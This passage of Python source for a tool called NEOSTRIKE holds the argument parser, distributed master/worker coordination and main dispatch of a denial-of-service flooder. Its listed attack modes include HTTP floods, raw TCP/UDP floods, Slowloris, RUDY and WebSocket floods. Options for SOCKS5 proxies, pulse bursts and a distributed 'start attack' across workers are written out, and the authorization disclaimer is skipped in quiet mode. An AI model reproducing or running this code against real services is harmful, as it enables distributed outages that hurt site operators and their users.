                   help="Duration (e.g. 30s, 5m, 1h)")
    p.add_argument("--requests", "-r", type=int,
                   help="Stop after N requests")
    p.add_argument("--rate", type=int, default=REQUEST_RATE_CAP,
                   help=f"Rate cap in req/s (default: {REQUEST_RATE_CAP})")
    p.add_argument("--path", "-p", type=str, default="/",
                   help="HTTP path to target (e.g. /api/login)")
    p.add_argument("--proxy", type=str,
                   help="SOCKS5 proxy URL (e.g. socks5://127.0.0.1:1080)")
    p.add_argument("--headers", type=str, nargs="*",
                   help="Custom headers as 'Key: Value' pairs")
    p.add_argument("--config", type=str,
                   help="Load config from JSON preset file")
    p.add_argument("--export", type=str, choices=["csv", "json"],
                   help="Export results to file (csv or json)")
    p.add_argument("--export-path", type=str,
                   help="Export file path (default: neostrike_results.<ext>)")
    p.add_argument("--pulse-burst", type=float, default=DEFAULT_PULSE_BURST,
                   help=f"Pulse burst seconds (default: {DEFAULT_PULSE_BURST})")
    p.add_argument("--pulse-pause", type=float, default=DEFAULT_PULSE_PAUSE,
                   help=f"Pulse pause seconds (default: {DEFAULT_PULSE_PAUSE})")
    p.add_argument("--no-pulse", action="store_true",
                   help="Disable pulse mode")
    p.add_argument("--save-config", type=str,
                   help="Save current config to JSON preset file")
    p.add_argument("--list-modes", action="store_true",
                   help="List all attack modes and exit")
    p.add_argument("--list-presets", action="store_true",
                   help="List saved preset files and exit")
    p.add_argument("--preset-dir", type=str, default="presets",
                   help="Directory for preset files (default: presets)")
    p.add_argument("--quiet", "-q", action="store_true",
                   help="Suppress interactive prompts (use CLI args only)")
    # Distributed testing
    p.add_argument("--master", type=str, nargs="?", const=str(DISTRIBUTED_PORT),
                   help="Run as distributed master (optionally specify port)")
    p.add_argument("--worker", type=str,
                   help="Run as distributed worker, connect to master (host:port)")
    # Web dashboard
    p.add_argument("--web", type=int, nargs="?", const=WEB_DASHBOARD_PORT,
                   help="Enable web dashboard (optionally specify port)")
    # Plugin system
    p.add_argument("--plugin-dir", type=str, default=PLUGIN_DIR,
                   help="Plugin directory (default: plugins)")
    p.add_argument("--list-plugins", action="store_true",
                   help="List loaded plugins and exit")
    return p


async def run_distributed_master(args) -> int:
    port = int(args.master) if args.master else DISTRIBUTED_PORT
    master = DistributedMaster(port=port)

    console.print("[ns.cyan]Starting distributed master...[/]")

    # Start master server in background
    server_task = asyncio.create_task(master.start())
    await asyncio.sleep(0.5)

    # Wait for workers
    console.print("[ns.amber]Waiting for workers to connect... (Ctrl+C to start attack)[/]")
    try:
        while not master.workers:
            await asyncio.sleep(1)
            console.print(f"[ns.dim]  {len(master.workers)} worker(s) connected[/]")
    except KeyboardInterrupt:
        pass

    if not master.workers:
        console.print("[ns.amber]No workers connected. Exiting.[/]")
        return 0

    console.print(f"[ns.green]{len(master.workers)} worker(s) ready[/]")

    # Get config from user or args
    if args.target and args.mode:
        target = args.target
        method = args.mode.upper()
        threads = args.threads
        duration = parse_duration(args.duration) if args.duration else 60
        rate = args.rate
        path = args.path
    else:
        target = Prompt.ask("[ns.cyan]Target[/]")
        method = prompt_method()
        threads = int(Prompt.ask("[ns.cyan]Threads per worker[/]", default="100"))
        duration = parse_duration(Prompt.ask("[ns.cyan]Duration[/]", default="60s"))
        rate = int(Prompt.ask("[ns.cyan]Rate per worker[/]", default="1000"))
        path = prompt_path()

    # Send config
    await master.send_config(target, method, threads, duration or 60, rate, path, args.proxy)
    console.print("[ns.green]Config sent to workers. Starting attack...[/]")

    # Start attack
    await master.start_attack()

    # Run attack with aggregate stats display
    start_time = time.monotonic()
    try:
        while True:
            agg = master.get_aggregate_stats()
            elapsed = time.monotonic() - start_time
            console.print(
                f"\r[ns.cyan]Workers:[/] {agg['workers']}  "
                f"[ns.green]RPS:[/] {agg['total_rps']:,.0f}  "
                f"[ns.pink]Sent:[/] {agg['total_sent']:,}  "
                f"[ns.bad]Errors:[/] {agg['total_errors']:,}  "
                f"[ns.amber]Elapsed:[/] {elapsed:.0f}s",
                end=""
            )
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        pass

    await master.stop_attack()
    console.print("\n[ns.amber]Attack stopped.[/]")

    # Final summary
    agg = master.get_aggregate_stats()
    t = Table(box=None, padding=(0, 2))
    t.add_column("Metric", style="ns.label")
    t.add_column("Result", style="ns.value")
    t.add_row("Workers", str(agg["workers"]))
    t.add_row("Total sent", f"{agg['total_sent']:,}")
    t.add_row("Total completed", f"{agg['total_completed']:,}")
    t.add_row("Total errors", f"{agg['total_errors']:,}")
    t.add_row("Total RPS", f"{agg['total_rps']:,.1f}")
    t.add_row("Total data", _fmt_bytes(agg["total_bytes_recv"]))
    console.print(Panel(t, title="[ns.pink]DISTRIBUTED SUMMARY[/]", border_style=HOT_PINK))

    server_task.cancel()
    return 0


async def run_distributed_worker(args) -> int:
    host, _, port = args.worker.partition(":")
    port = int(port) if port else DISTRIBUTED_PORT

    worker = DistributedWorker(master_host=host, master_port=port)
    await worker.connect()
    return 0


def main() -> int:
    arg_parser = build_arg_parser()
    args = arg_parser.parse_args()

    # Plugin discovery
    plugin_mgr = PluginManager(args.plugin_dir)
    plugin_mgr.discover()

    if args.list_modes:
        methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "TCP", "UDP", "SLOWLORIS", "RUDY", "WEBSOCKET"]
        desc = {
            "GET": "Standard HTTP GET flood",
            "POST": "HTTP POST with body payload",
            "HEAD": "Lightweight headers-only flood",
            "PUT": "HTTP PUT with body payload",
            "DELETE": "HTTP DELETE flood",
            "TCP": "Raw TCP connection/packet flood",
            "UDP": "Raw UDP packet flood",
            "SLOWLORIS": "Low-bandwidth connection exhaustion",
            "RUDY": "R-U-Dead-Yet slow POST attack",
            "WEBSOCKET": "WebSocket connection flood",
        }
        # Add plugin modes
        for name, data in plugin_mgr.plugins.items():
            for m in data["info"].get("methods", []):
                methods.append(m)
                desc[m] = data["info"].get("description", f"Plugin: {name}")

        table = Table(box=None, padding=(0, 2))
        table.add_column("Mode", style="ns.cyan")
        table.add_column("Description", style="ns.dim")
        for m in methods:
            table.add_row(m, desc.get(m, "Unknown"))
        console.print(Panel(table, title="[ns.cyan]ATTACK MODES[/]", border_style=ELECTRIC_PURPLE))
        return 0

    if args.list_presets:
        list_presets(args.preset_dir)
        return 0

    if args.list_plugins:
        plugin_mgr.list_plugins()
        return 0

    # Distributed master mode
    if args.master is not None:
        return asyncio.run(run_distributed_master(args))

    # Distributed worker mode
    if args.worker:
        return asyncio.run(run_distributed_worker(args))

    # Normal mode
    logger, log_path = setup_logger()
    logger.info("NEOSTRIKE session started | python=%s | platform=%s",
                platform.python_version(), platform.platform())

    if not args.quiet and not show_disclaimer():
        console.print("[ns.amber]Authorization not confirmed. Exiting.[/]")
        logger.info("Authorization declined. Exiting.")
        return 0

    # Build config from args or preset
    cfg: Optional[TestConfig] = None

    if args.config:
        try:
            preset = load_preset(args.config)
            method = preset.get("mode", "GET").upper()
            path = preset.get("path", "/")
            target = preset.get("target", "")
            targets = parse_targets(target, method, path)
            headers = dict(DEFAULT_HEADERS)
            headers.update(preset.get("headers", {}))
            cfg = TestConfig(
                targets=targets,
                method=method,
                headers=headers,
                concurrency=preset.get("threads", DEFAULT_CONCURRENCY),
                duration_s=parse_duration(str(preset.get("duration", ""))) if preset.get("duration") else None,
                request_target=preset.get("requests"),
                rate_cap=preset.get("rate", REQUEST_RATE_CAP),
                proxy=preset.get("proxy"),
                pulse=(preset.get("pulse_burst", 0.0), preset.get("pulse_pause", 0.0)),
                http_path=path,
            )
            console.print(f"[ns.green]  + Loaded preset from {args.config}[/]")
        except Exception as exc:
            console.print(f"[ns.bad]  x Failed to load preset: {exc}[/]")
            return 1

    if cfg is None:
        if args.target and args.mode:
            # CLI mode
            method = args.mode.upper()
            http_path = args.path
            targets = parse_targets(args.target, method, http_path)
            headers = dict(DEFAULT_HEADERS)
            if args.headers:
                for h in args.headers:
                    if ":" in h:
                        k, v = h.split(":", 1)
                        headers[k.strip()] = v.strip()
            duration_s = parse_duration(args.duration) if args.duration else None
            pulse = (args.pulse_burst, args.pulse_pause) if not args.no_pulse else (0.0, 0.0)
            cfg = TestConfig(
                targets=targets,
                method=method,
                headers=headers,
                concurrency=min(args.threads, MAX_CONCURRENCY),
                duration_s=duration_s,
                request_target=args.requests,
                rate_cap=args.rate,
                proxy=args.proxy,
                pulse=pulse,
                http_path=http_path,
            )
        elif not args.quiet:
            # Interactive mode
            try:
                cfg = configure()
            except KeyboardInterrupt:
                console.print("\n[ns.amber]Configuration aborted.[/]")
                return 0

    if cfg is None:
        console.print("[ns.amber]Launch cancelled.[/]")
        logger.info("Launch cancelled by user.")
        return 0

    # Save config if requested
    if args.save_config:
        preset = {
            "target": ", ".join(ti.url or f"{ti.host}:{ti.port}" for ti in cfg.targets),
            "mode": cfg.method,
            "path": cfg.http_path,
            "threads": cfg.concurrency,
            "duration": cfg.duration_s,
            "requests": cfg.request_target,
            "rate": cfg.rate_cap,
            "proxy": cfg.proxy,
            "pulse_burst": cfg.pulse[0] if cfg.pulse != (0.0, 0.0) else None,
            "pulse_pause": cfg.pulse[1] if cfg.pulse != (0.0, 0.0) else None,
            "headers": {k: v for k, v in cfg.headers.items() if k not in DEFAULT_HEADERS},
        }
        save_preset(args.save_config, preset)

    target_str = ", ".join(t.url or f"{t.host}:{t.port}" for t in cfg.targets)
    logger.info("CONFIG target=%s mode=%s concurrency=%d duration=%s "
                "req_target=%s rate_cap=%s proxy=%s path=%s",
                target_str, cfg.method, cfg.concurrency,
                cfg.duration_s, cfg.request_target, cfg.rate_cap,
                cfg.proxy or "none", cfg.http_path)

    stats = Stats(started_at=time.monotonic())
    stopper = StopController()

    def _sigint(_sig, _frm):
        stopper.request_stop()
    signal.signal(signal.SIGINT, _sigint)

    stopper.start_key_listener()
    layout = make_layout()

    # Start web dashboard if requested
    dashboard = None
    if args.web is not None:
        web_port = int(args.web) if args.web else WEB_DASHBOARD_PORT
        dashboard = WebDashboard(port=web_port)

    console.clear()

    # Start web dashboard
    async def run_with_dashboard():
        if dashboard:
            await dashboard.start(stats)
        # Run the actual test
        if cfg.method in ("TCP", "UDP"):
            run_raw_test(cfg, stats, stopper, logger, None, None)
        elif cfg.method == "SLOWLORIS":
            run_raw_test(cfg, stats, stopper, logger, None, None, worker_fn=slowloris_worker)
        elif cfg.method == "RUDY":
            run_raw_test(cfg, stats, stopper, logger, None, None, worker_fn=rudy_worker)
        elif cfg.method == "WEBSOCKET":
            await run_websocket_test(cfg, stats, stopper, logger, None, None)
        else:
            await run_http_test(cfg, stats, stopper, logger, None, None)

    try:
        if dashboard:
            asyncio.run(run_with_dashboard())
        else:
            with Live(layout, console=console, refresh_per_second=UI_REFRESH_PER_SEC,
                      screen=True) as live:
                if cfg.method in ("TCP", "UDP"):
                    run_raw_test(cfg, stats, stopper, logger, live, layout)
                elif cfg.method == "SLOWLORIS":
                    run_raw_test(cfg, stats, stopper, logger, live, layout,
                                 worker_fn=slowloris_worker)
                elif cfg.method == "RUDY":
                    run_raw_test(cfg, stats, stopper, logger, live, layout,
                                 worker_fn=rudy_worker)
                elif cfg.method == "WEBSOCKET":
                    asyncio.run(
                        run_websocket_test(cfg, stats, stopper, logger, live, layout)
                    )
                else:
                    asyncio.run(
                        run_http_test(cfg, stats, stopper, logger, live, layout)
                    )
    except KeyboardInterrupt:
        stopper.request_stop()
    except Exception as exc:
        logger.exception("Fatal error in main loop: %s", exc)
        console.print(f"[ns.bad]Fatal error: {exc}[/]")
    finally:
        stopper.request_stop()

    final_summary(cfg, stats, logger, log_path)

    # Export if requested
    if args.export:
        export_path = args.export_path or f"neostrike_results.{args.export}"
        if args.export == "json":
            export_json(cfg, stats, export_path)
        elif args.export == "csv":
            export_csv(cfg, stats, export_path)

    logger.info("NEOSTRIKE session ended.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
